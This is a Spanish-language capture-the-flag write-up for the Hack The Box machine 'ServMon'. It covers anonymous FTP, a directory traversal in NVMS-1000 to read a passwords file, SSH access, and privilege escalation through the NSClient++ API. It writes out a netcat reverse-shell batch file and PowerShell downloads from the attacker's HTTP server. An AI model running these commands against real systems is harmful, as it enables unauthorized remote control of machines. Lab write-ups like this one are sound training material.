

# SERVMON

Comenzamos la enumeración con  nmap (Previamente había detectado los puertos):

```shell
# Nmap 7.80 scan initiated Wed Apr 22 01:40:50 2020 as: 
nmap -p21,22,80,135,139,445,5040,5666,6063,6699,7680,8443 -sC -sV -T5 -oN nmap-scsv 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.14s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|     AuthInfo:
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|_    </html>
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
5666/tcp open  tcpwrapped
6063/tcp open  x11?
6699/tcp open  napster?
7680/tcp open  pando-pub?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/22%Time=5E9FD8EC%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nCon
SF:tent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xe
SF:f\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\
SF:x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-tra
SF:nsitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtm
SF:l\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<s
SF:cript\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20w
SF:indow\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20
SF:</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOption
SF:s,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-
SF:Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb
SF:\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Tr
SF:ansitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transiti
SF:onal\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\
SF:r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script
SF:\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window
SF:\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</scr
SF:ipt>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPRequest,1B4
SF:,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Lengt
SF:h:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf<
SF:!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transit
SF:ional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional\
SF:.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n<h
SF:ead>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x20t
SF:ype=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.loc
SF:ation\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</script>\
SF:r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(FourOhFourRequest,65
SF:,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-type:\x20text/html\r\nCon
SF:tent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/22%Time=5E9FD8F3%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x1
SF:8;\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x201
SF:8\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x
SF:20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSP
SF:Request,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x
SF:20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m01s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-22T05:44:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 22 01:44:37 2020 -- 1 IP address (1 host up) scanned in 227.59 seconds
```

Empezando desde puertos bajos vemos que esta ftp permitido con anonymous así que exploramos

```
root@kali:~/HTB/servmon# ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd nadine
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> cd ..
250 CWD command successful.
ftp> cd nathan
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:10PM                  186 Notes to do.txt
226 Transfer complete.
ftp> get Notes\ to\ do.txt
```

Encontré 2 txt y 2 directorios de usuarios usuarios.

users: Nathan, Nadine

txt: Confidentials.txt, Notes to do.txt

```
root@kali:~/HTB/servmon# cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

Nos indica que hay archivo Passwords.txt en el escritorio de Nathan. El otro txt no dice mucho de valor.

```
root@kali:~/HTB/servmon# cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

Regresando a lo encontrado con el escaneo de nmap encontramos una web llamada NVMS-1000

```
window.location.href = "Pages/login.htm";
```

![1587790293732](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1587790293732.png)

Con ayuda de google podemos verificar que esta aplicación es vulnerable a directory transversal attack ya que al saltar de directorios por la url podemos visualizar algún archivo alojado en el servidor.

Analizamos el exploit: https://www.exploit-db.com/exploits/47774

Entonces con ayuda de burpsuite interceptamos le trafico al cargar nuevamente la pagina y lo enviamos al repeater para ahora modificar la petición get, saltar los directorios y visualizar el escritorio de Nathan donde nos indicaron que dejaron el archivo passwords.txt

![1587790697430](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1587790697430.png)

En la sección de respuesta encontramos el contenido.

Ahora probamos estas credenciales en tanto en la web y por ssh. Después de hacer intentos manualmente encontramos unas credenciales que nos sirven para obtener acceso por ssh:

User: Nadine Password: L1k3B1gBut7s@W0rk

```
root@kali:~/HTB/servmon# ssh Nadine@10.10.10.184
Nadine@10.10.10.184's password: 

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine

08/04/2020  23:16    <DIR>          .
08/04/2020  23:16    <DIR>          ..        
18/01/2020  11:23    <DIR>          3D Objects
18/01/2020  11:23    <DIR>          Contacts  
08/04/2020  22:28    <DIR>          Desktop   
08/04/2020  22:28    <DIR>          Documents 
22/04/2020  19:03    <DIR>          Downloads 
08/04/2020  22:27    <DIR>          Favorites 
08/04/2020  22:27    <DIR>          Links     
18/01/2020  11:23    <DIR>          Music     
18/01/2020  11:31    <DIR>          OneDrive
18/01/2020  11:23    <DIR>          Pictures
18/01/2020  11:23    <DIR>          Saved Games
18/01/2020  11:23    <DIR>          Searches
18/01/2020  11:23    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  27,420,446,720 bytes free

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>dor
'dor' is not recognized as an internal or external command,
operable program or batch file.

nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop

08/04/2020  22:28    <DIR>          .
08/04/2020  22:28    <DIR>          ..
22/04/2020  18:52                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,420,446,720 bytes free

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
16067f8461fcc8275**************

```

Y ya tenemos el user.txt.

Ahora seguimos con la enumeración. Probamos por SMB y no tuvimos éxito.

En el puerto 8443 tenemos un servicio web https de NetClient++.

![1587791087579](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1587791087579.png)

Probamos algunas credenciales que ya teníamos pero no funciona.

Averiguando sobre el programa vemos que existe un exploit, el cual se basa en que puede ejecutar scripts  externos en el sistema con los privilegios del usuario usado en la instalación es decir con privilegios de administrador.

![1587791657414](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1587791657414.png)

En esta imagen podemos apreciar como funcionan los scripts, el uso de CheckExternalScripts nos proporciona la capacidad de ejecutar comandos. Pero CheckExternalScripts no ejecuta scripts automáticamente, sino que simplemente delega el comando a la shell de Windows y este lo ejecuta como un programa normal. 

Entonces solo deberíamos crear un reverse shell en .bat que se ejecuta nativamente en windows, subirlo como un external script y ejecutarlo a través del nsclient++.

Googleando para conocer el programa encontramos este enlace en donde nos brinda información útil de donde podemos encontrar la contraseña y demás configuraciones del programa.

<https://kifarunix.com/how-to-install-nsclient-nagios-monitoring-agent-on-windows-system/>

![1592634350599](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1592634350599.png)

Nos dirigimos a esa ruta para revisar el archivo de configuración:

```bash
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
´╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help

; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1

; in flight - TODO
[/settings/NRPE/server]

[/modules]

; Undocumented key
CheckHelpers = disabled

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA   
Scheduler = enabled

; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled

[/settings/external scripts/wrappings]

[/settings/external scripts/scripts]

; Schedules - Section for the Scheduler module.
[/settings/scheduler/schedules]

; Undocumented key
foobar = command = foobar

; External script settings - General settings for the external scripts module (CheckExternalScripts).
[/settings/external scripts]
allow arguments = true
```

He borrado parte del texto del archivo para no ocupar mucho espacio, sin embargo he dejado la estructura y todos los módulos que tiene. Lo primero que encontramos es la contraseña

```shel
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
```

Lo probamos pero en la web pero nos arroja un error 403 debido a  que no tenemos permitido el acceso. Y eso lo podemos verificar en el archivo de configuración donde el único host permitido (allowed hosts) es el mismo server (127.0.0.1).

También encontramos que el CheckExternalScript esta habilitado

```
; CheckExternalScripts - Module used to execute external scripts
CheckExternalScripts = enabled
```

Si deseamos seguir el exploit deberíamos realizar una tunelización por ssh: <https://www.exploit-db.com/exploits/46802> sin embargo este pedía reinicio de la maquina así que decidí  buscar otra forma.

Buscando encontré que este programa tiene una API lo cual nos permite realizar algunas tareas usando CURL. Entonces siguiendo la metodología RTFM (Read The Fucking Manual) encontré la forma de agregar un external script y ejecutarlo. 

Leyendo:<https://docs.nsclient.org/api/rest/>

![1587793711881](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1587793711881.png)

Vemos que el usuario por default es 'admin', así que lo probamos con la contraseña encontrada en el archivo de configuración (ew2x6SsGTxjRwXOT) y validamos que podamos acceder a la API.

```shell
nadine@SERVMON C:\Program Files\NSClient++>powershell -c "curl.exe -k -u admin https://127.0.0.1:8443/api"
Enter host password for user 'admin':
{"beta_api":"https://127.0.0.1:8443/api/v1","current_api":"https://127.0.0.1:8443/api/v1","legacy_api":"https://127.0.0.1:8443
/"}
```

Y vemos que si nos responde, después de esto ya era ver la manera de aprovecharlo.

Leyendo: <https://docs.nsclient.org/api/rest/scripts/>

Nos indica como agregar un script, pero hacemos algunas variaciones a nuestro estilo por que no me funcionaba tal cual:

Entonces creamos un script lexsaaaa.bat con el siguiente contenido que establece lo que se ejecutará en el servidor:

```shell
C:\Temp\lexsaaaa.bat
```

Lo agregamos como un external script :

```shell
nadine@SERVMON C:\Program Files\NSClient++>powershell -c "curl.exe -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/lexsaaaa.bat --data-binary C:\Users\Nadine\Downloads\lexsaaaa.bat"
Enter host password for user 'admin':
Added lexsaaaa as scripts\lexsaaaa.bat
```

Verificamos que se haya agregado:

```shell
nadine@SERVMON C:\Program Files\NSClient++>powershell -c "curl.exe -k -u admin https://127.0.0.1:8443/api/v1/scripts/ext"     
Enter host password for user 'admin':
["lexsaaaa"]
```

Verificamos en la ruta de ejecución

```shell
nadine@SERVMON C:\Program Files\NSClient++>powershell -c "curl.exe -k -u admin https://127.0.0.1:8443/api/v1/scripts/ext/lexsaaaa"
Enter host password for user 'admin':
scripts\lexsaaaa.bat
```

Verificamos en el archivo de configuración nsclient.ini y vemos que si aparece:

```
[/settings/external scripts/scripts]

; Undocumented key
lexsaaaa = scripts\lexsaaaa.bat
```

Verificamos que el contenido del external script lexsaaaa.bat este correcto:

```shell
nadine@SERVMON C:\Program Files\NSClient++>cd scripts

nadine@SERVMON C:\Program Files\NSClient++\scripts>type lexsaaaa.bat
C:\Temp\lexsaaaa.bat
```

Ahora, como ya establecimos lo que queremos ejecutar, ahora debemos crearlo  y descargarlo en el servidor en la misma ruta que establecimos en el external script. Lo que yo haré será un reverse shell con netcat por lo que tambien necesitaré descargarlo en esa ruta.

El bat seria el siguiente:

```bash
root@kali:~/HTB/servmon# cat lexsaaaa.bat 
@echo off
C:\Temp\nc.exe  10.10.14.27 4466 -e cmd.exe
```

Levantamos un servidor http con Python:

```shell
root@kali:~/HTB/servmon# python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
```

Iniciamos las descargas:

```cmd
nadine@SERVMON C:\Temp>powershell Invoke-WebRequest "http://10.10.14.27:8000/lexsaaaa.bat -OutFile .\lexsaaaa.bat"

nadine@SERVMON C:\Temp>powershell Invoke-WebRequest "http://10.10.14.27:8000/nc.exe -OutFile .\nc.exe"      

nadine@SERVMON C:\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Temp

25/04/2020  07:14    <DIR>          .
25/04/2020  07:14    <DIR>          ..
25/04/2020  07:06                72 lexsaaaa.bat
25/04/2020  07:14            59,392 nc.exe
               2 File(s)         59,464 bytes
               2 Dir(s)  27,431,362,560 bytes free
nadine@SERVMON C:\temp>type lexsaaaa.bat
@echo off
C:\Temp\nc.exe  10.10.14.27 4466 -e cmd.exe
```

Ahora tocaría ejecutar el external script.

Leyendo:<https://docs.nsclient.org/api/rest/queries/>

Nos indica que podemos hacer consultas a nuestro external script y lo mas valioso es que estas consultas nos detalla el query de ejecución.

```powershell
nadine@SERVMON C:\Program Files\NSClient++>powershell -c "curl.exe -k -u admin https://127.0.0.1:8443/api/v1/queries/lexsaaaa"
Enter host password for user 'admin':
{"description":"Alias for: scripts\\lexsaaaa.bat","execute_nagios_url":"https://127.0.0.1:8443/api/v1/queries/lexsaaaa/commands/execute_nagios","execute_url":"https://1
27.0.0.1:8443/api/v1/queries/lexsaaaa/commands/execute","metadata":{},"name":"lexsaaaa","title":"lexsaaaa"}
```

lo importante es:

```
"execute_url":"https://127.0.0.1:8443/api/v1/queries/lexsaaaa/commands/execute"
```

Entonces aplicamos esa consulta de ejecución, pero antes abrimos un puerto de escucha en nuestro kali para recibir la shell reversa.

```powershell
nadine@SERVMON C:\Program Files\NSClient++>powershell -c "curl.exe -k -u admin https://127.0.0.1:8443/api/v1/queries/lexsaaaa/commands/execute"
Enter host password for user 'admin':
{"command":"lexsaaaa","lines":[{"message":"\r\nC:\\Program Files\\NSClient++>C:\\Temp\\lexsaaaa.bat","perf":{}}],"result":1}
```

Y recibimos nuestro shell reverso como root.

```shell
josef@kali:~$ rlwrap nc -lvnp 4466
listening on [any] 4466 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.184] 50314
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system

C:\Program Files\NSClient++>hostname
hostname
ServMon

C:\Program Files\NSClient++>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
4cf77a501b1896dc**************
```

Y somos root !     \\( ^^)/ 



------



Otra forma de ejecutar nuestro script es crear un tunel por shh y usarlo como un servidor de salto para acceder a la web de NSClient++

Más info: <https://www.ssh.com/ssh/tunneling/example>

Entonces haríamos lo siguiente:

```
root@kali:~/HTB/servmon# ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

Esto nos abre una conexión al `10.10.10.184`como servidor de salto y reenvía cualquier conexión  que hagamos al puerto 8443 en nuestro kali al puerto 8443 e IP  `127.0.0.1` del servidor.

Luego de ello ya tenemos acceso a la web conectandonos a traves de nuestro navegador

![1587796287839](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1587796287839.png)

Nos logeamos con las credenciales que ya obtuvimos y podemos verificar nuestro external script en la sección de settings.

![1587796059445](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1587796059445.png)



y podemos ejecutarlo desde la misma web en la sección de querys:

![1592636844832](C:\Users\Josef\AppData\Roaming\Typora\typora-user-images\1592636844832.png)

Happy_hacking!